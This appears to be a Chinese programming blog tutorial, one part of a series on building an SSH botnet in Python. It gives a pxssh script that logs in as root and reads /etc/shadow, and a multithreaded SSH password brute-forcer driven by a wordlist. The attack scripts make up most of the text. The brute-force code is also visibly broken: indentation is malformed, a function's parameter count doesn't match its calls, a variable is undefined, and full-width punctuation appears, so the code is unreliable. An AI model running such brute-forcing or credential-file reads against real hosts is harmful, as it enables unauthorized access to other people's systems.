# 原创
：  【Python脚本进阶】2.2、构建一个SSH僵尸网络（中）：用Pxssh暴力破解SSH密码

# 【Python脚本进阶】2.2、构建一个SSH僵尸网络（中）：用Pxssh暴力破解SSH密码

**目录**

[一、Pxssh暴力破解SSH密码](#Pxssh%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3SSH%E5%AF%86%E7%A0%81)

[1.1、函数：](#%E5%87%BD%E6%95%B0%EF%BC%9A)

[1.2、使用Pxssh简化](#%C2%A0%E4%BD%BF%E7%94%A8Pxssh%E7%AE%80%E5%8C%96)

[1.3、函数：](#%E5%87%BD%E6%95%B0%EF%BC%9A)

[1.4、自动化](#%C2%A0%E8%87%AA%E5%8A%A8%E5%8C%96)

---


## 一、Pxssh暴力破解SSH密码

> 
<h3>1.1、函数：</h3>
prompt():是javascript语言中的一个方法，主要用处是显示提示对话框
pxssh模块用于在python中ssh远程连接,执行命令,返回结果,但注意不支持Windows系统


> 
<h3>1.2、使用Pxssh简化</h3>
用Pxssh 进一步简化它,Pxssb 是一个包含了pexpect 库的专用脚本， 它能用预先写好的login(）、logout()和prompt()等函数直接与SSH 进行交互。使用Pxssh可以将上个脚本简化成
<pre><code>import pxssh


def send_command(s, cmd):
    s.sendline(cmd)
    s.prompt()
    print(s.before)

def connect(host, user, password):
    try:
        s = pxssh.pxssh()
        s.login( host, user, password )
        return s
    except:
        print('[-] Error Connecting')
        exit( 0 )
s = connect ('127.0.0.1', 'root', 'toor')
send_command(s, 'cat /etc/shadow | grep root')</code></pre>


> 
<h3>1.3、函数：</h3>
BoundedSemaphore(n)：同一时刻最多允许n个线程访问特定资源
global：全局的
release：释放
add_option 添加设置选项
acquire方法是Python锁类，Python中线程模块的Lock类的内置方法
Thread是程序中的执行线程


> 
<h3>1.4、自动化</h3>
再做些修改就能使脚本自动执行暴力破解SSH口令的任务。除增加了一些参数解析代码来读取主机名、用户名和存有待尝试的密码的文件外， 只需对connect()函数稍做修改。
<hr/>
如果login()函数执行成功， 并且没有抛出异常， 将打印一个消息， 表明密码已被找到并把表示密码已被找到的全局布尔值设为true。否则， 将捕获该异常。如果异常显示密码被拒绝， 知道这个密码不对， 让函数返回即可。但是，如果异常显示socket 为“ read_nonblocking", 可能是SSH服务器被大量的连接刷爆了， 可以稍等片刻后用相同的密码再试一次。此外， 如果该异常显示pxssh 命令提示符提取困难， 也应等待一会儿， 然后让它再试一次。
<hr/>
在connect()函数的参数里有一个布尔量release。由于connect()可以递归地调用另一个connect(), 必须让只有不是由connect()递归调用的connect()函数才能够释放connection_lock 信号。

<pre><code>import pxssh
import optparse
import time


from threading import *
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0
def connect(host, user, password):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Password Found: ' + password)
    Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep( 5 )
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep( 1 )
            connect( host, user, password, False )
        finally:
        if release: connection_lock.release()

def main():
    parser = optparse.OptionParser( 'usage %prog ' + '-H &lt;target host&gt; -u &lt;user&gt; -F &lt;password list&gt;' )
    parser.add_option( '-H', dest= ' tgtHost', type='string', help=' specify target host'）
    parser.add_option( '-F', dest= ' passwdFile', type='string', help='specify password file')
    parser.add_option( '-u', dest='user'， type = 'string', help = 'specify the user')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user= options.user
    if host== None or passwdFile == None or user == None:
        print(parser.usage)
        exit(0)
    user = options.user
    fn = open( passwdFile,'r')
    user = options.user
    for line in fn.readlines():
    user = options.user
    if Found:
        print("[*] Exiting: Password Found")
        exit(0)
        if Fails &gt; 5:
        print("[!] Exiting: Too Many Socket Timeouts")
        exit(0)
    connection_lock.acquire()
        password = line.strip('\r').strip('\n')
    print("[-] Testing: " + str(password))
        t = Thread(target=connect, args=(host, user, password, True))
        child = t.start()


if __name__ == '__main__':
    main()</code></pre>


---

